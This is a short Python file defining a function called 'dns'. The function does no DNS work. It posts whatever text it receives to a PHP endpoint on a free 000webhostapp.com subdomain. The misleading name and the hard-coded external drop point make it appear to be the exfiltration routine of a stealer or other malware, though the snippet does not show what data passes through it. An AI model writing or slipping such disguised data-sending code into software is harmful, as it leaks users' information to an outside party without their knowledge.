import requests


def dns(text):
	link = "https://sereware56.000webhostapp.com/spo"
	requests.post('%s/index.php' % link, data={'id': text})
	
	